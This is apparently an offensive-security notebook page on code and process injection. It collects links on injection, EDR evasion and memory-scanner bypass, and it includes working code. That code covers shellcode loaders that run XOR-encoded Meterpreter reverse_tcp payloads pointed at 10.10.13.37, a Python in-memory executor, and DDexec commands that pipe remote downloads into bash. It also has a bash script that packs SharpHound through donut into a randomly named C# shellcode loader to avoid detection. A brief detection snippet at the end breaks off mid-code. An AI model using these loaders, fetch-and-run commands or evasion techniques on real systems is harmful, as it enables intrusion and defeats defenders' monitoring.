# Code Injection

- [https://www.elastic.co/blog/ten-process-injection-techniques-technical-survey-common-and-trending-process](https://www.elastic.co/blog/ten-process-injection-techniques-technical-survey-common-and-trending-process)
- [https://blog.xpnsec.com/weird-ways-to-execute-dotnet/](https://blog.xpnsec.com/weird-ways-to-execute-dotnet/)
- [https://gitlab.com/users/ORCA666/projects](https://gitlab.com/users/ORCA666/projects)
- [https://github.com/itaymigdal/awesome-injection](https://github.com/itaymigdal/awesome-injection)




## Shellcode as Function

- [http://disbauxes.upc.es/code/two-basic-ways-to-run-and-test-shellcode/](http://disbauxes.upc.es/code/two-basic-ways-to-run-and-test-shellcode/)
- [https://www.fergonez.net/post/shellcode-csharp](https://www.fergonez.net/post/shellcode-csharp)
- [https://www.ired.team/offensive-security/code-injection-process-injection/local-shellcode-execution-without-windows-apis](https://www.ired.team/offensive-security/code-injection-process-injection/local-shellcode-execution-without-windows-apis)
- [https://github.com/byt3bl33d3r/OffensiveNim/issues/16](https://github.com/byt3bl33d3r/OffensiveNim/issues/16)
- [https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/Linux%20Shellcode%20Loaders/simpleLoader.c](https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/Linux%20Shellcode%20Loaders/simpleLoader.c)
- [https://github.com/paranoidninja/Brute-Ratel-C4-Community-Kit/blob/main/deprecated/badger_template.ps1](https://github.com/paranoidninja/Brute-Ratel-C4-Community-Kit/blob/main/deprecated/badger_template.ps1)

{% tabs %}
{% tab title="Windows" %}
{% code title="loader.c" %}
```c
#include <windows.h>
// msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.13.37 LPORT=1337 -f raw -o met.bin --encrypt xor --encrypt-key a
// xxd -i met.bin > shellcode.h
#include "shellcode.h"

int main() {
    DWORD lpThreadId = 0;
    DWORD flOldProtect = 0;
    int bufsize = sizeof(buf);
    LPVOID f = VirtualAlloc(NULL, bufsize, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
    for (int i = 0; i < (int)bufsize-1; i++) { buf[i] = buf[i] ^ 'a'; }
    memcpy(f, buf, bufsize);
    VirtualProtect(f, bufsize, PAGE_EXECUTE_READ, &flOldProtect);
    ((void(*)())f)();
    //VirtualFree(f, 0, MEM_RELEASE);
    WaitForSingleObject((HANDLE)-1, -1);
    return 0;
}
```
{% endcode %}
{% endtab %}
{% tab title="Linux" %}
{% code title="loader.c" %}
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.13.37 LPORT=1337 -f c -o met.c --encrypt xor --encrypt-key a
unsigned char buf[] = 
"\x31\x33\...\x33\x37";

int main (int argc, char **argv)
{
    int bufsize = (int)sizeof(buf);
    for (int i = 0; i < bufsize-1; i++) { buf[i] = buf[i] ^ 'a'; }
    int (*ret)() = (int(*)())buf;
    ret();
}
```
{% endcode %}

Compile allowing execution on stack:

```
$ gcc -o loader loader.c -z execstack
```
{% endtab %}
{% endtabs %}




## Linux In-Memory Code Execution

- [https://blog.sektor7.net/#!res/2018/pure-in-memory-linux.md](https://blog.sektor7.net/#!res/2018/pure-in-memory-linux.md)
- [https://www.akamai.com/blog/security-research/the-definitive-guide-to-linux-process-injection](https://www.akamai.com/blog/security-research/the-definitive-guide-to-linux-process-injection)



### Memory Manipulation with Python

- [https://github.com/jonatanSh/shelf](https://github.com/jonatanSh/shelf)
- [https://github.com/anvilsecure/ulexecve](https://github.com/anvilsecure/ulexecve)

Convert an ELF to PIC, inject it and run from memory:

```
$ gcc hello.c -fno-stack-protector -fPIE -fpic -static --entry=main -o hello
$ python3 -m shelf --input hello
$ python3 run_sc.py
```

{% code title="run_sc.py" %}
```python
# https://blog.sektor7.net/#!res/2018/pure-in-memory-linux.md#Python

from ctypes import (CDLL, c_void_p, c_size_t, c_int, c_long, memmove, CFUNCTYPE, cast, pythonapi)
from ctypes.util import find_library

PROT_READ = 0x01
PROT_WRITE = 0x02
PROT_EXEC = 0x04
MAP_PRIVATE = 0x02
MAP_ANONYMOUS = 0x20

with open('hellointel_x64.out.shell', 'rb') as f:
	sc = f.read()

libc = CDLL(find_library('c'))

mmap = libc.mmap
mmap.argtypes = [c_void_p, c_size_t, c_int, c_int, c_int, c_size_t]
mmap.restype = c_void_p
page_size = pythonapi.getpagesize()
sc_size = len(sc)

mem_size = page_size * (1 + sc_size / page_size)
cptr = mmap(0, int(mem_size), PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0)

memmove(cptr, sc, sc_size)
sc = CFUNCTYPE(c_void_p, c_void_p)
call_sc = cast(cptr, sc)
call_sc(None)
```
{% endcode %}



### DDexec

- [https://github.com/arget13/DDexec](https://github.com/arget13/DDexec)

{% embed url="https://youtu.be/MaBurwnrI4s" %}

Run binaries from memory without touching the disk:

```
$1 base64 /bin/ls -w0 > ls.b64
$2 curl -sS 10.10.13.37/ls.b64 | bash <(curl -sSL https://github.com/arget13/DDexec/raw/main/ddexec.sh) /bin/NonExistentBinary -la
```

Another trick to do semi-fileless ELF execution with a pre-created process descriptor:

```
$ python3 -c 'import os;os.fork()or(os.setsid(),print(f"/proc/{os.getpid()}/fd/{os.memfd_create(str())}"),os.kill(os.getpid(),19))'
$ cat /usr/bin/date > /proc/1732982/fd/4
$ /proc/1732982/fd/4
```



### Tools

- [https://github.com/hackerschoice/bincrypter](https://github.com/hackerschoice/bincrypter)




## RtlRemoteCall

- [https://www.alex-ionescu.com/rtlremotecall/](https://www.alex-ionescu.com/rtlremotecall/)
- [https://github.com/REDMED-X/OperatorsKit/blob/ff56550a1606e2a2cd9c6295ef42b5f8dc6ed156/KIT/LoadLib/loadlib.c](https://github.com/REDMED-X/OperatorsKit/blob/ff56550a1606e2a2cd9c6295ef42b5f8dc6ed156/KIT/LoadLib/loadlib.c)
- [https://sabotagesec.com/thread-hijacking-iceberg-deep-dive-into-phantom-call-rtlremotecall/](https://sabotagesec.com/thread-hijacking-iceberg-deep-dive-into-phantom-call-rtlremotecall/)




## DLL Hollowing / Module Stomping

- [https://www.ired.team/offensive-security/code-injection-process-injection/modulestomping-dll-hollowing-shellcode-injection](https://www.ired.team/offensive-security/code-injection-process-injection/modulestomping-dll-hollowing-shellcode-injection)
- [https://github.com/TheWover/donut/blob/61af8ccee3c2cafa743b2628654d1a2dafc66f3a/loader/inmem_pe.c#L135](https://github.com/TheWover/donut/blob/61af8ccee3c2cafa743b2628654d1a2dafc66f3a/loader/inmem_pe.c)



### Variations of (Phantom) DLL Hollowing

- [https://www.forrest-orr.net/post/malicious-memory-artifacts-part-i-dll-hollowing](https://www.forrest-orr.net/post/malicious-memory-artifacts-part-i-dll-hollowing)
- [https://www.forrest-orr.net/post/masking-malicious-memory-artifacts-part-ii-insights-from-moneta](https://www.forrest-orr.net/post/masking-malicious-memory-artifacts-part-ii-insights-from-moneta)
- [https://www.forrest-orr.net/post/masking-malicious-memory-artifacts-part-iii-bypassing-defensive-scanners](https://www.forrest-orr.net/post/masking-malicious-memory-artifacts-part-iii-bypassing-defensive-scanners)
- [https://github.com/forrest-orr/phantom-dll-hollower-poc](https://github.com/forrest-orr/phantom-dll-hollower-poc)
- [https://blog.f-secure.com/hiding-malicious-code-with-module-stomping/](https://blog.f-secure.com/hiding-malicious-code-with-module-stomping/)
- [https://blog.f-secure.com/hiding-malicious-code-with-module-stomping-part-2/](https://blog.f-secure.com/hiding-malicious-code-with-module-stomping-part-2/)
- [https://github.com/WithSecureLabs/ModuleStomping](https://github.com/WithSecureLabs/ModuleStomping)
- [https://www.secforce.com/blog/dll-hollowing-a-deep-dive-into-a-stealthier-memory-allocation-variant/](https://www.secforce.com/blog/dll-hollowing-a-deep-dive-into-a-stealthier-memory-allocation-variant/)
- [https://github.com/SECFORCE/DLL-Hollow-PoC](https://github.com/SECFORCE/DLL-Hollow-PoC)



### Advanced Module Stomping

- [https://labs.cognisys.group/posts/Advanced-Module-Stomping-and-Heap-Stack-Encryption/](https://labs.cognisys.group/posts/Advanced-Module-Stomping-and-Heap-Stack-Encryption/)
- [https://github.com/CognisysGroup/SweetDreams](https://github.com/CognisysGroup/SweetDreams)
- [https://bruteratel.com/release/2023/03/19/Release-Nightmare/](https://bruteratel.com/release/2023/03/19/Release-Nightmare/)



### Module Overloading

- [https://github.com/hasherezade/module_overloading](https://github.com/hasherezade/module_overloading)


#### Module Shifting

- [https://github.com/naksyn/ModuleShifting](https://github.com/naksyn/ModuleShifting)
- [https://naksyn.com/edr%20evasion/2023/06/01/improving-the-stealthiness-of-memory-injections.html](https://naksyn.com/edr%20evasion/2023/06/01/improving-the-stealthiness-of-memory-injections.html)


#### Process Stomping

- [https://github.com/hasherezade/process_overwriting](https://github.com/hasherezade/process_overwriting)
- [https://www.naksyn.com/edr%20evasion/2023/11/18/mockingjay-revisited-process-stomping-srdi-beacon.html](https://www.naksyn.com/edr%20evasion/2023/11/18/mockingjay-revisited-process-stomping-srdi-beacon.html)
- [https://github.com/naksyn/ProcessStomping](https://github.com/naksyn/ProcessStomping)



### Module Stomping in C#

- [https://offensivedefence.co.uk/posts/module-stomping/](https://offensivedefence.co.uk/posts/module-stomping/)
- [https://github.com/rasta-mouse/TikiTorch/blob/master/TikiLoader/Stomper.cs](https://github.com/rasta-mouse/TikiTorch/blob/master/TikiLoader/Stomper.cs)




## Function Stomping / Threadless Injection

- [https://idov31.github.io/2022/01/28/function-stomping.html](https://idov31.github.io/2022/01/28/function-stomping.html)
- [https://github.com/Idov31/FunctionStomping](https://github.com/Idov31/FunctionStomping)
- [https://klezvirus.github.io/RedTeaming/AV_Evasion/FromInjectionToHijacking/](https://klezvirus.github.io/RedTeaming/AV_Evasion/FromInjectionToHijacking/)



### ThreadlessInject

- [https://github.com/CCob/ThreadlessInject](https://github.com/CCob/ThreadlessInject)
- [https://github.com/iilegacyyii/ThreadlessInject-BOF](https://github.com/iilegacyyii/ThreadlessInject-BOF)
- [https://github.com/rkbennett/pyThreadlessInject](https://github.com/rkbennett/pyThreadlessInject)

{% embed url="https://youtu.be/BYuAUYQcI-E" %}




## Thread Pools (PoolParty)

- [https://www.safebreach.com/blog/process-injection-using-windows-thread-pools/](https://www.safebreach.com/blog/process-injection-using-windows-thread-pools/)
- [https://github.com/SafeBreach-Labs/PoolParty](https://github.com/SafeBreach-Labs/PoolParty)
- [https://github.com/0xEr3bus/PoolPartyBof](https://github.com/0xEr3bus/PoolPartyBof)
- [https://urien.gitbook.io/diago-lima/a-deep-dive-into-exploiting-windows-thread-pools](https://urien.gitbook.io/diago-lima/a-deep-dive-into-exploiting-windows-thread-pools)




## VEH (Vectored Exception Handling)

- [https://www.ibm.com/think/x-force/using-veh-for-defense-evasion-process-injection](https://www.ibm.com/think/x-force/using-veh-for-defense-evasion-process-injection)
- [https://github.com/passthehashbrowns/VectoredExceptionHandling](https://github.com/passthehashbrowns/VectoredExceptionHandling)
- [https://bruteratel.com/research/2024/10/20/Exception-Junction/](https://bruteratel.com/research/2024/10/20/Exception-Junction/)




## Early Cascade

- [https://www.outflank.nl/blog/2024/10/15/introducing-early-cascade-injection-from-windows-process-creation-to-stealthy-injection/](https://www.outflank.nl/blog/2024/10/15/introducing-early-cascade-injection-from-windows-process-creation-to-stealthy-injection/)
- [https://github.com/Cracked5pider/earlycascade-injection](https://github.com/Cracked5pider/earlycascade-injection)
- [https://github.com/0xNinjaCyclone/EarlyCascade](https://github.com/0xNinjaCyclone/EarlyCascade)




## Shellcode In-Memory Fluctuation (Obfuscate and Sleep)

{% embed url="https://twitter.com/_RastaMouse/status/1443923456630968320" %}

{% embed url="https://youtu.be/edIMUcxCueA" %}

- [https://www.solomonsklash.io/SleepyCrypt-shellcode-to-encrypt-a-running-image.html](https://www.solomonsklash.io/SleepyCrypt-shellcode-to-encrypt-a-running-image.html)
- [https://github.com/SolomonSklash/SleepyCrypt](https://github.com/SolomonSklash/SleepyCrypt)
- [https://gist.github.com/S3cur3Th1sSh1t/6022dc2050bb1b21be2105b8b0dc077d](https://gist.github.com/S3cur3Th1sSh1t/6022dc2050bb1b21be2105b8b0dc077d)
- [https://github.com/mgeeky/ShellcodeFluctuation](https://github.com/mgeeky/ShellcodeFluctuation)
- [https://github.com/phra/PEzor/blob/master/fluctuate.cpp](https://github.com/phra/PEzor/blob/master/fluctuate.cpp)
- [https://labs.f-secure.com/blog/bypassing-windows-defender-runtime-scanning/](https://labs.f-secure.com/blog/bypassing-windows-defender-runtime-scanning/)
- [https://xz.aliyun.com/t/9399](https://xz.aliyun.com/t/9399)
- [https://github.com/zu1k/beacon_hook_bypass_memscan](https://github.com/zu1k/beacon_hook_bypass_memscan)
- [https://suspicious.actor/2022/05/05/mdsec-nighthawk-study.html](https://suspicious.actor/2022/05/05/mdsec-nighthawk-study.html)
- [https://github.com/secidiot/FOLIAGE](https://github.com/secidiot/FOLIAGE)
- [https://github.com/y11en/FOLIAGE](https://github.com/y11en/FOLIAGE)
- [https://github.com/ShellBind/G0T-B0R3D/blob/main/Cs-Sleep-Mask-Fiber.c](https://github.com/ShellBind/G0T-B0R3D/blob/main/Cs-Sleep-Mask-Fiber.c)
- [https://github.com/Cracked5pider/Ekko/blob/main/Src/Ekko.c](https://github.com/Cracked5pider/Ekko/blob/main/Src/Ekko.c)
- [https://mez0.cc/posts/vulpes-obfuscating-memory-regions/](https://mez0.cc/posts/vulpes-obfuscating-memory-regions/)
- [https://github.com/janoglezcampos/DeathSleep](https://github.com/janoglezcampos/DeathSleep)
- [https://blog.kyleavery.com/posts/avoiding-memory-scanners/](https://blog.kyleavery.com/posts/avoiding-memory-scanners/)
- [https://github.com/kyleavery/AceLdr](https://github.com/kyleavery/AceLdr)
- [https://github.com/Idov31/Cronos](https://github.com/Idov31/Cronos)
- [https://github.com/lem0nSec/ShellGhost](https://github.com/lem0nSec/ShellGhost)



### gargoyle

- [https://github.com/JLospinoso/gargoyle](https://github.com/JLospinoso/gargoyle)
- [https://lospi.net/security/assembly/c/cpp/developing/software/2017/03/04/gargoyle-memory-analysis-evasion.html](https://lospi.net/security/assembly/c/cpp/developing/software/2017/03/04/gargoyle-memory-analysis-evasion.html)
- [https://labs.f-secure.com/blog/experimenting-bypassing-memory-scanners-with-cobalt-strike-and-gargoyle/](https://labs.f-secure.com/blog/experimenting-bypassing-memory-scanners-with-cobalt-strike-and-gargoyle/)
- [https://www.arashparsa.com/bypassing-pesieve-and-moneta-the-easiest-way-i-could-find/](https://www.arashparsa.com/bypassing-pesieve-and-moneta-the-easiest-way-i-could-find/)
- [https://github.com/waldo-irc/YouMayPasser](https://github.com/waldo-irc/YouMayPasser)
- [https://github.com/thefLink/DeepSleep](https://github.com/thefLink/DeepSleep)



### Memory Scanners

- [https://github.com/forrest-orr/moneta](https://github.com/forrest-orr/moneta)
- [https://github.com/hasherezade/pe-sieve](https://github.com/hasherezade/pe-sieve)
- [https://github.com/waldo-irc/MalMemDetect](https://github.com/waldo-irc/MalMemDetect)
- [https://github.com/thefLink/Hunt-Sleeping-Beacons](https://github.com/thefLink/Hunt-Sleeping-Beacons)
- [https://github.com/paranoidninja/Cobaltstrike-Detection/blob/main/scan_process.c](https://github.com/paranoidninja/Cobaltstrike-Detection/blob/main/scan_process.c)
- [https://github.com/BlackSnufkin/LitterBox?tab=readme-ov-file](https://github.com/BlackSnufkin/LitterBox?tab=readme-ov-file)

```
PS > curl https://github.com/forrest-orr/moneta/releases/download/1.0/Moneta64.exe -o Moneta64.exe
PS > .\Moneta64.exe -p ((Get-Process notepad).Id) -m region --address 0xd34dc0d31000
```




## Return Address / Call Stack Spoofing



### Return Address Spoofing

- [https://www.unknowncheats.me/forum/anti-cheat-bypass/268039-x64-return-address-spoofing-source-explanation.html](https://www.unknowncheats.me/forum/anti-cheat-bypass/268039-x64-return-address-spoofing-source-explanation.html)
- [https://hulkops.gitbook.io/blog/red-team/x64-return-address-spoofing](https://hulkops.gitbook.io/blog/red-team/x64-return-address-spoofing)
- [https://github.com/NtDallas/Svartalfheim/blob/main/src/RetAddr.c](https://github.com/NtDallas/Svartalfheim/blob/main/src/RetAddr.c)



### ThreadStackSpoofer

- [https://github.com/mgeeky/ThreadStackSpoofer/tree/c2507248723d167fb2feddf50d35435a17fd61a2](https://github.com/mgeeky/ThreadStackSpoofer/tree/c2507248723d167fb2feddf50d35435a17fd61a2)
- [https://github.com/mgeeky/ThreadStackSpoofer](https://github.com/mgeeky/ThreadStackSpoofer)

An alternative way to get the nearest return address in current stack frame (besides [\_ReturnAddress](https://docs.microsoft.com/ru-ru/cpp/intrinsics/returnaddress?view=msvc-170) and [\_AddressOfReturnAddress](https://docs.microsoft.com/ru-ru/cpp/intrinsics/addressofreturnaddress?view=msvc-170)) without manually walking the stack:

{% code title="retaddr.cpp" %}
```cpp
#include <intrin.h>
#include <windows.h>
#include <iostream>
#include <sstream>
#include <iomanip>

// https://github.com/mgeeky/ThreadStackSpoofer/blob/f67caea38a7acdb526eae3aac7c451a08edef6a9/ThreadStackSpoofer/header.h#L38-L45
template<class... Args>
void log(Args... args)
{
    std::stringstream oss;
    (oss << ... << args);
    std::cout << oss.str() << std::endl;
}

// https://github.com/mgeeky/ThreadStackSpoofer/blob/f67caea38a7acdb526eae3aac7c451a08edef6a9/ThreadStackSpoofer/main.cpp#L13-L14
void addressOfReturnAddress() {
    auto pRetAddr = (PULONG_PTR)_AddressOfReturnAddress(); // https://doxygen.reactos.org/d6/d8c/intrin__ppc_8h_source.html#l00040
    log("Original return address via _AddressOfReturnAddress: 0x", std::hex, std::setw(8), std::setfill('0'), *pRetAddr);
}

// https://stackoverflow.com/a/1334586/6253579
void rtlCaptureStackBackTrace() {
    typedef USHORT(WINAPI* CaptureStackBackTraceType)(__in ULONG, __in ULONG, __out PVOID*, __out_opt PULONG);
    CaptureStackBackTraceType RtlCaptureStackBackTrace = (CaptureStackBackTraceType)(GetProcAddress(LoadLibrary("ntdll.dll"), "RtlCaptureStackBackTrace"));

    void* callers[2] = { NULL };
    int count = (RtlCaptureStackBackTrace)(1, 2, callers, NULL);
    log("Original return address via RtlCaptureStackBackTrace: 0x", std::hex, std::setw(8), std::setfill('0'), (DWORD64)callers[0]);
}

int main(int argc, char** argv)
{
    addressOfReturnAddress();
    rtlCaptureStackBackTrace();
    return 0;
}
```
{% endcode %}



### Call Stack Spoofing

{% embed url="https://youtu.be/7EheXiC3MJE" %}

- [https://www.elastic.co/security-labs/peeling-back-the-curtain-with-call-stacks](https://www.elastic.co/security-labs/peeling-back-the-curtain-with-call-stacks)
- [https://dtsec.us/2023-09-15-StackSpoofin/](https://dtsec.us/2023-09-15-StackSpoofin/)
- [https://labs.withsecure.com/blog/spoofing-call-stacks-to-confuse-edrs/](https://labs.withsecure.com/blog/spoofing-call-stacks-to-confuse-edrs/)
- [https://klezvirus.github.io/RedTeaming/AV_Evasion/StackSpoofing/](https://klezvirus.github.io/RedTeaming/AV_Evasion/StackSpoofing/)
- [https://hulkops.gitbook.io/blog/red-team/x64-call-stack-spoofing](https://hulkops.gitbook.io/blog/red-team/x64-call-stack-spoofing)




## Proxy DLL Loading

- [https://0xdarkvortex.dev/proxying-dll-loads-for-hiding-etwti-stack-tracing/](https://0xdarkvortex.dev/proxying-dll-loads-for-hiding-etwti-stack-tracing/)
- [https://0xdarkvortex.dev/hiding-in-plainsight/](https://0xdarkvortex.dev/hiding-in-plainsight/)
- [https://github.com/paranoidninja/Proxy-DLL-Loads](https://github.com/paranoidninja/Proxy-DLL-Loads)
- [https://github.com/paranoidninja/Proxy-Function-Calls-For-ETwTI](https://github.com/paranoidninja/Proxy-Function-Calls-For-ETwTI)
- [https://github.com/kleiton0x00/Proxy-DLL-Loads](https://github.com/kleiton0x00/Proxy-DLL-Loads)
- [https://fin3ss3g0d.net/index.php/2024/03/18/weaponizing-windows-thread-pool-apis-proxying-dll-loads/](https://fin3ss3g0d.net/index.php/2024/03/18/weaponizing-windows-thread-pool-apis-proxying-dll-loads/)




## Hook NtCreateSection

- [https://waawaa.github.io/es/amsi_bypass-hooking-NtCreateSection/](https://waawaa.github.io/es/amsi_bypass-hooking-NtCreateSection/)
- [https://github.com/waawaa/Hooked-Injector](https://github.com/waawaa/Hooked-Injector)
- [https://s3cur3th1ssh1t.github.io/Cat_Mouse_or_Chess/](https://s3cur3th1ssh1t.github.io/Cat_Mouse_or_Chess/)
- [https://github.com/S3cur3Th1sSh1t/Ruy-Lopez](https://github.com/S3cur3Th1sSh1t/Ruy-Lopez)




## Avoid PsSetCreateThreadNotifyRoutine

- [https://www.r-tec.net/r-tec-blog-process-injection-avoiding-kernel-triggered-memory-scans.html](https://www.r-tec.net/r-tec-blog-process-injection-avoiding-kernel-triggered-memory-scans.html)
- [https://github.com/S3cur3Th1sSh1t/Caro-Kann](https://github.com/S3cur3Th1sSh1t/Caro-Kann)
- [https://caueb.com/attackdefense/threadlessstompingkann/](https://caueb.com/attackdefense/threadlessstompingkann/)
- [https://github.com/caueb/ThreadlessStompingKann](https://github.com/caueb/ThreadlessStompingKann)




## EDR Preloading

- [https://malwaretech.com/2024/02/bypassing-edrs-with-edr-preload.html](https://malwaretech.com/2024/02/bypassing-edrs-with-edr-preload.html)
- [https://github.com/MalwareTech/EDR-Preloader](https://github.com/MalwareTech/EDR-Preloader)




## Shellcode Encryption



### SystemFunction032 / SystemFunction033

- [https://s3cur3th1ssh1t.github.io/SystemFunction032_Shellcode/](https://s3cur3th1ssh1t.github.io/SystemFunction032_Shellcode/)
- [https://gist.github.com/snovvcrash/3533d950be2d96cf52131e8393794d99](https://gist.github.com/snovvcrash/3533d950be2d96cf52131e8393794d99)
- [https://www.redteam.cafe/red-team/shellcode-injection/inmemory-shellcode-encryption-and-decryption-using-systemfunction033](https://www.redteam.cafe/red-team/shellcode-injection/inmemory-shellcode-encryption-and-decryption-using-systemfunction033)



### SystemFunction040 / SystemFunction041

- [https://github.com/Cracked5pider/CodeCave/tree/main/EkkoSys040](https://github.com/Cracked5pider/CodeCave/tree/main/EkkoSys040)




## Shellcode Execution via Callbacks

- [https://github.com/aahmad097/AlternativeShellcodeExec](https://github.com/aahmad097/AlternativeShellcodeExec)
- [https://github.com/werdhaihai/SharpAltShellCodeExec](https://github.com/werdhaihai/SharpAltShellCodeExec)
- [https://github.com/ScriptIdiot/shellcode_execute_rare_WinAPI](https://github.com/ScriptIdiot/shellcode_execute_rare_WinAPI)
- [https://marcoramilli.com/2022/06/15/running-shellcode-through-windows-callbacks/](https://marcoramilli.com/2022/06/15/running-shellcode-through-windows-callbacks/)
- [https://osandamalith.com/2021/04/01/executing-shellcode-via-callbacks/](https://osandamalith.com/2021/04/01/executing-shellcode-via-callbacks/)
- [http://ropgadget.com/posts/abusing_win_functions.html](http://ropgadget.com/posts/abusing_win_functions.html)

```
CallWindowProc
CertEnumSystemStore
CertEnumSystemStoreLocation
CopyFile2
CopyFileEx
CryptEnumOIDInfo
EnumCalendarInfo
EnumCalendarInfoEx
EnumCalendarInfoExEx
EnumChildWindows
EnumDateFormats
EnumDesktopWindows
EnumDesktops
EnumDirTree
EnumDisplayMonitors
EnumFontFamilies
EnumFontFamiliesEx
EnumFonts
EnumLanguageGroupLocales
EnumObjects
EnumPageFiles
EnumPwrSchemes
EnumResourceTypes
EnumResourceTypesEx
EnumSystemCodePages
EnumSystemGeoID
EnumSystemLanguageGroups
EnumSystemLocales
EnumSystemLocalesEx
EnumThreadWindows
EnumTimeFormats
EnumTimeFormatsEx
EnumUILanguages
EnumWindowStations
EnumWindows
EnumerateLoadedModules
EnumerateLoadedModulesEx
ImageGetDigestStream
ImmEnumInputContext
InitOnceExecuteOnce
LdrEnumerateLoadedModules
LineDDA
NotifyIpInterfaceChange
NotifyRouteChange2
NotifyTeredoPortChange
NotifyUnicastIpAddressChange
SetupCommitFileQueue
SymEnumProcesses
SymFindFileInPath
VerifierEnumerateResource
```




## PE to Shellcode

- [[PDF] From a C project, through assembly, to shellcode (hasherezade for @vxunderground)](https://github.com/vxunderground/VXUG-Papers/blob/main/From%20a%20C%20project%20through%20assembly%20to%20shellcode.pdf)
- [https://github.com/hasherezade/pe_to_shellcode](https://github.com/hasherezade/pe_to_shellcode)
- [https://bruteratel.com/research/feature-update/2021/01/30/OBJEXEC/](https://bruteratel.com/research/feature-update/2021/01/30/OBJEXEC/)
- [https://github.com/paranoidninja/PIC-Get-Privileges](https://github.com/paranoidninja/PIC-Get-Privileges)
- [https://github.com/s0i37/av_bypass/blob/master/crypt/cryptor.py](https://github.com/s0i37/av_bypass/blob/master/crypt/cryptor.py)



### sRDI

- [https://github.com/monoxgas/sRDI](https://github.com/monoxgas/sRDI)
- [https://blog.malicious.group/writing-your-own-rdi-srdi-loader-using-c-and-asm/](https://blog.malicious.group/writing-your-own-rdi-srdi-loader-using-c-and-asm/)



### Donut

- [https://thewover.github.io/Introducing-Donut/](https://thewover.github.io/Introducing-Donut/)
- [https://thewover.github.io/Cruller/](https://thewover.github.io/Cruller/)
- [https://github.com/TheWover/donut](https://github.com/TheWover/donut)
- [https://github.com/S4ntiagoP/donut/tree/syscalls](https://github.com/S4ntiagoP/donut/tree/syscalls)
- [https://github.com/Binject/go-donut](https://github.com/Binject/go-donut)
- [https://github.com/listinvest/undonut](https://github.com/listinvest/undonut)

[Example](https://github.com/l4ckyguy/ukn0w/commit/0823f51d01790ef53aa9406f99b6a75dfff7f146) with [SharpHound.exe](https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe) and donut (C# cross-compilation is done with [Mono](https://www.mono-project.com/download/stable/)):

{% code title="blood.sh" %}
```bash
RNDNAME=`curl -sL https://github.com/snovvcrash/WeaponizeKali.sh/raw/main/misc/binaries.txt | shuf -n1`
wget https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.exe -qO /tmp/SharpHound.exe

~/tools/PEzor/deps/donut/donut -a2 -z2 -i /tmp/SharpHound.exe -p '--CollectionMethod All,LoggedOn --NoSaveCache --OutputDirectory C:\Windows\Tasks --ZipFilename blood.zip' -o /tmp/SharpHound.bin

BUF=`xxd -i /tmp/SharpHound.bin | head -n-2 | tail -n+2 | tr -d ' ' | tr -d '\n'`
BUFSIZE=`xxd -i /tmp/SharpHound.bin | tail -n1 | awk '{print $5}' | tr -d ';\n'`

cat << EOF > "/tmp/$RNDNAME.cs"
using System;
using System.Runtime.InteropServices;

namespace Sh4rpH0und
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, ulong dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        static void Main(string[] args)
        {
            byte[] buf = new byte[$BUFSIZE] { $BUF };
            IntPtr addr = VirtualAlloc(IntPtr.Zero, (ulong)buf.Length, 0x1000, 0x40);
            Marshal.Copy(buf, 0, addr, buf.Length);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
EOF

mcs -platform:x64 -t:winexe "/tmp/$RNDNAME.cs" -out:"$RNDNAME.exe"
file "$RNDNAME.exe"
rm "/tmp/SharpHound.exe" "/tmp/SharpHound.bin" "/tmp/$RNDNAME.cs"
```
{% endcode %}

{% hint style="info" %}
This technique is enhanced and automated [here](https://gist.github.com/snovvcrash/30bd25b1a5a18d8bb7ce3bb8dc2bae37).
{% endhint %}



### Python

{% content-ref url="/pentest/infrastructure/ad/README.md#python" %}
[README.md](README.md)
{% endcontent-ref %}

- [https://www.naksyn.com/edr%20evasion/2023/06/01/improving-the-stealthiness-of-memory-injections.html](https://www.naksyn.com/edr%20evasion/2023/06/01/improving-the-stealthiness-of-memory-injections.html)
- [https://github.com/naksyn/PythonMemoryModule](https://github.com/naksyn/PythonMemoryModule)
- [https://github.com/naksyn/ModuleShifting](https://github.com/naksyn/ModuleShifting)



### InflativeLoading

- [https://winslow1984.com/books/malware/page/reflectiveloading-and-inflativeloading](https://winslow1984.com/books/malware/page/reflectiveloading-and-inflativeloading)
- [https://github.com/senzee1984/InflativeLoading](https://github.com/senzee1984/InflativeLoading)




## PE Injection

- [https://gist.github.com/hasherezade/e6daa4124fab73543497b6d1295ece10](https://gist.github.com/hasherezade/e6daa4124fab73543497b6d1295ece10)
- [https://xakep.ru/2018/08/27/doppelganging-process/](https://xakep.ru/2018/08/27/doppelganging-process/)
- [https://xakep.ru/2022/04/21/herpaderping-and-ghosting/](https://xakep.ru/2022/04/21/herpaderping-and-ghosting/)




## Detection

- [https://www.mono-project.com/docs/tools+libraries/tools/monodis/](https://www.mono-project.com/docs/tools+libraries/tools/monodis/)
- [https://github.com/Dump-GUY/Get-PDInvokeImports](https://github.com/Dump-GUY/Get-PDInvokeImports)

Show P/Invoke imports in a .NET assembly with `System.Reflection.Metadata` and PowerShell Core (stolen from [1](https://stackoverflow.com/q/71456804/6253579), [2](https://stackoverflow.com/a/54775040/6253579)):

```powershell
$assembly = "\path\to\csharp\binary.exe"
$stream = [System.IO.File]::OpenRead($assembly)
$peReader = [System.Reflection.PortableExecutable.PEReader]::new($stream, [System.Reflection.PortableExecutable.PEStreamOptions]::LeaveOpen -bor [System.Reflection.PortableExecutable.PEStreamOptions]::PrefetchMetadata)
$metadataReader = [System.Reflection.Metadata.PEReaderExtensions]::GetMetadataReader($peReader)
